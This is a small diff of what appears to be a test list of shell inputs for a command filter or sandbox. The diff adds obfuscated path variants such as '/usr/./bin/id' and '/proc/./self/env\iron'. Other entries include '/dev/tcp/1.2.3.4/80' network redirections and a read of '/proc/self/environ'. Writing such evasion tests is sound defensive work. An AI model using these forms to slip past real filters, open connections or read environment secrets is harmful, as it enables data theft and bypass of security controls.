@@ -739,15 +739,15 @@ jobs -x ls
 /bin/uname -a
 < /dev/fd/1
 < /dev/null
-foo /dev/stder\r
+foo /dev/std\err
 foo < /dev/stdin
 foo /dev/stdo\ut
 blah > /dev\/tcp/1.2.3.4/80
 blah > /dev/ud\p/1.2.3.4/80
-foo /dev/zero
-/usr/bin/id
+foo /dev/./zero
+/usr/./bin/id
 /usr/bin/le\ss
-/usr/bin/m\ore
+/usr/./bin/m\ore
 /usr/bin/nic\e
 /usr/bin/uname -a
-foo /proc/self/env\iron
+foo /proc/./self/env\iron
